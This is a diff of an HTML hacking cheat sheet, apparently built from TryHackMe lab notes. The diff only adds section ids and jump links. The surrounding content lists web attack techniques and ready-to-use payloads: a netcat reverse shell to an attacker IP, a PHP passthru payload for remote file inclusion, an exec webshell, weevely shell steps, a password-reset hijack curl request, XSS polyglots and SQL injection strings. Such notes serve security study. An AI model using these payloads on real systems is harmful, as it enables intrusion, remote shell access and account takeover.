@@ -19,7 +19,7 @@
               <!--  information gathering section start from here    -->
 
 <br><br><h1 style="text-align: center;text-decoration: underline;">Information Gathering</h1>
-<div>
+<div id="information-gathering-section">
 <h2><li>Primary Information Gathering</li></h2> 
 <p><b>Using browser ----</b>
   <ol>1. source view</ol> <ol>2. inspect<ol>Inspector</ol><ol>Debugger</ol><ol>Network</ol></ol> </p>
@@ -94,7 +94,8 @@
               <!--  Vulnerability Finding section start from here    -->
 
   <br><br><h1 style="text-align: center;text-decoration: underline;">Vulnerability Finding</h1>
-  <div>
+  <div id="vulnerability-section">
+    <div id="auth-bypass-vuln">
     <h2><li>Authentication Bypass</li></h2>
     <p><b>Brute Force</b></p>
     <ol>ffuf tool:
@@ -104,16 +105,23 @@
     </ol>
     <p><b>Bypassing reset email vulnability</b></p>
     curl 'http://10.10.109.51/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
-    
+    </div>
+
+    <div id="idor-vuln">
     <h2><li>IDOR vulnerabilities</li></h2>
     IDOR vulnerabilities: change url info (like http://online-service.thm/profile?user_id=1305, change id value) and see it vulnerable or not. url maybe encoded(base64) or hashed. if not found in url, check in network tab.
-    
+    </div>
+
+    <div id="file-upload-vuln">
     <h2><li>File upload vulnerability</li></h2>
+    <a href="#file-upload-exploit">[jump to exploit]</a>
     <p> If website allow to upload any kind file like .php, .python then this vulnerability exist. <br>
     If they block other file upload, then intercept the request with burp suit, modifiy file name then forward it.<br>
     if they check file extension too.. then modifiy name with like this >>>> shell.php.jpg</p>
+    </div>
 
-    <h2><li>Remote code execution [RCE] vulnerability</li></h2>
+    <div id="rce-vuln">
+    <li><h2>Remote code execution [RCE] vulnerability </h2> <a href="#rce-exploit">[jump to exploit]</a></li>
     <p>If website allow to execute code with their allow code like[their_code;attacker_code] <br>
       Or, directly allow to run system command, then this vulnerability exist. <br>
     mixing code would be --- <b>[their_code;attacker_code]</b> or <b>[their_code ; attacker_code]</b> or <b>[their_code|attacker_code]</b> or <b>[their_code | attacker_code]</b> or <b>[their_code&&attacker_code]</b> or <b>[their_code && attacker_code]</b></p>
@@ -123,25 +131,36 @@
     <ol>Verbose Command Injection:
       <ol>Run any command and see it's output</ol>
     </ol>
+    </div>
 
+    <div id="lfi-vuln">
     <h2><li>Local File Inclusion (LFI)</li></h2>
+    <a href="#lfi-exploit">[jump to exploit]</a><br><br>
      <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png" style="width:500.5px;height:250px">
      <p>If website allow user to execute command in quary string after '=' sign, then this vulnerability happend.<br>Normally this cause happend for file_get_contents PHP fuction.</p>
      <p>If PHP 5.3.3 and down then NULLBYTE (%00 or 0x00) vulnerability will working.</p>
-    
+    </div>
+
+    <div id="rfi-vuln">
     <h2><li>Remote File Inclusion - RFI</li></h2>
+    <a href="#rfi-exploit">[jump to exploit]</a><br><br>
     <p>Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application.<br> Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. <br>One requirement for RFI is that the allow_url_fopen option needs to be on.</p>
     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" style="width:650.5px;height:400.368px">
-  
+    </div>
 
+    <div id="ssrf-vuln">
     <h2><li>Server-Side Request Forgery (SSRF)</li></h2>
     <p>
      If website allow to inject payload on url parameter, html form value. then this vulnerability exits.<br>
      To exploit it try to inject payload on parameters or redirect to another site work exploit it. "&x=" use to bypass logical parameters.<br>
      if '/' not work then use x/. 
     </p>
+    </div>
+    
+    <div id="xss-vuln">
     <h2><li>Cross Site Scripting (XSS)</li></h2>
-    <p>Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.<br>
+    <a href="#xss-exploit">[jump to exploit]</a><br><br>
+    <p>Cross-Site Scripting, better known as XSS in the cybersecurity community, is idified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.<br>
       Three types of XSS exists - 
       <ol><b>Reflected XSS </b>
       <ol>How to test for Reflected XSS:</ol>
@@ -174,12 +193,16 @@
         <p>Same as stored XSS</p>
       </ol>
     </p>
+    </div>
 
+    <div id="sql-injection-vuln">
     <h2><li>SQL Injection</li></h2>
+    <a href="#sqi-injection-exploit">[jump to exploit]</a><br><br>
     <h3>Error Based</h3>
     <p>The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).
 
     </p>
+    </div>
   </div>
             <!--  Vulnerability Finding section end here    -->
 
@@ -188,14 +211,19 @@
 
               <!--  Exploitation section start from here    -->
   <br><br><h1 style="text-align: center;text-decoration: underline;">Exploitation</h1>
-  <div>
+  <div id="exploitation-section">
+    <div id="file-upload-exploit">
     <h2><li>File upload vulnerability exploit</li></h2>
+     <a href="#file-upload-vuln">[jump to vulnerability]</a><br><br>
     <b>Exploit file upload vulnerability using weevly:</b>
     <ol>Generate php shell >> weevely generate [password] [file_name]</ol>
     <ol>Connect with shell >> weevely [url to file] [password]</ol>
+    </div>
 
   <!--        Remote code execution exploit       -->
+  <div id="rce-exploit">
   <br><br>  <h2><li>Remote code execution [RCE] exploit</li></h2>
+  <a href="#rce-vuln">[jump to vulnerability]</a><br><br>
     <p>The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.<br>
     in all f these cases you need to listen for port 8080 using the foolowing command: <b>nc -vv -l -p 8080</b>
 <br><br>
@@ -219,9 +247,11 @@ nc -e /bin/sh 10.20.14 8080<br>
     <br>
     <b>*** Bypass filtering: </b> use hexadecimal code to bypass filtering.
     <p>RCE Cheat Sheet: <a href="https://github.com/payloadbox/command-injection-payload-list" target="_blank">cheat sheet</a></p>
-
+  </div>
 <br><br>
+    <div id="lfi-exploit">
     <h2><li>Local File Inclusion (LFI) exploitation</li></h2>
+    <a href="#lfi-vuln">[jump to vulnerability]</a><br><br>
     <p>Execute command in quary string</p>
     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png" style="width:650.25px;height:300px">
      <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png" style="width:650.25px;height:550px"><br>
@@ -246,17 +276,22 @@ nc -e /bin/sh 10.20.14 8080<br>
     </ol>
     <b>Tips: </b><i>some time it only work on url. it also some time work on specified folder. find it and execute payload there. If get request is broken, then sent payload with post request. always try this.
       <br>inject code POST. try to inject payload anywhere.
-    </i>
+    </i></p></div>
+    
 
-
+    <div id="rfi-exploit">
     <h2><li>Remote File Inclusion (RFI) exploitation</li></h2>
+    <a href="#rfi-vuln">[jump to vulnerability]</a><br><br>
     <p>Remote file inclusion same as LFI. sent payload url as input. <br>
     make php payload like ( <pre>  &lt;?passthru("nc -e /bin/sh [ip] [port]");?&gt;</pre>) or any kind of command and save it as a txt file.<br>
     Then give this file url as a payload with '?' at the end of the payload.<br><br>
     To execute command and see output use <pre> &lt;?php print exec('[cmd]');?&gt;</pre>
     </p>
-
+    </div>
+    
+    <div id="xss-exploit">
     <h2><li>Cross Site Scripting (XSS) exploitation</li></h2>
+    <a href="#xss-vuln">[jump to vulnerability]</a><br><br>
     <h3>Some common XSS payload -</h3>
     <P>
       <b>Proof Of Concept:</b><br>
@@ -277,8 +312,11 @@ nc -e /bin/sh 10.20.14 8080<br>
       <ol><pre>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</pre></ol>
       <p><b>***</b> View source code and try diffrent methon.</p>
     </P>
-    
+    </div>
+
+    <div id="sqi-injection-exploit">
     <h2><li>SQL Injection exploitation</li></h2>
+    <a href="#sql-injection-vuln">[jump to vulnerability]</a><br><br>
     <p><ol>Some simple SQL command: <ol>1. database()  -- To see database name.</ol>
                                     <ol>2. </ol>
     </ol></p>
@@ -302,6 +340,7 @@ nc -e /bin/sh 10.20.14 8080<br>
     admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
     
    </p>
+    </div>
 </div>
    <!-- Exploitation section end here  -->
 </body>
